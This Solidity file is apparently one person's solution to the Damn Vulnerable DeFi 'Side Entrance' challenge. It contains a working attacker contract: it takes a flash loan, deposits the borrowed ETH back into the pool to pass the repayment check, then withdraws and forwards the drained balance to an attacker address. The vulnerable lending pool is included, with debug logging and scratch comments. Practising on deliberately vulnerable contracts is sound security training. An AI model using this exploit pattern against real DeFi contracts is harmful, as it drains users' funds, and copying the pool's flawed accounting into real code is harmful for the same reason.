// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPoolAttacker {
    SideEntranceLenderPool public pool;
    address payable public  attacker;
    constructor(address addr) {
        console.log('constructor');
        pool = SideEntranceLenderPool(addr);
    }

    function execute () external payable {  // нахйя???
        console.log("HOW???");
        // pool.
        pool.deposit{value: msg.value}(); // drain pool
        // IFlashLoanEtherReceiver(msg.sender).execute{value: msg.value}();
    }

    function attack () public { // 
        console.log('attack');

        // deposit
        // withdraw
        // flashLoans???
        // execute
    } 

    function attack1(uint256 amount, address payable attackerAddr) external {
        console.log('attack1');
        attacker = attackerAddr;
        pool.flashLoan(amount);
        console.log('after');
        pool.withdraw();
    }

    fallback() external payable {
        console.log("fallback");
    }

    receive() external payable {
        console.log("receive");
        // withdraw??
        // pool.withdraw();
        // .tranfer?
        // withdraw the money and upon receive
        attacker.transfer(msg.value);
    }
    
    //     receive () external payable {
    //     attacker.transfer(msg.value);
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        console.log('deposit');
        balances[msg.sender] += msg.value;
        console.log('balances', balances[msg.sender]);
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        console.log('amountToWithdraw', amountToWithdraw);
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        console.log('====1===');
        // console.log('balanceBefore', balanceBefore);
        // NO OWNER check
        require(balanceBefore >= amount, "Not enough ETH in balance");
        console.log('====2===');
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
        // execute function in different contract
        console.log('====3===');
        console.log('====balance===', address(this).balance);
        console.log('====balanceBefore===', balanceBefore);
        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
 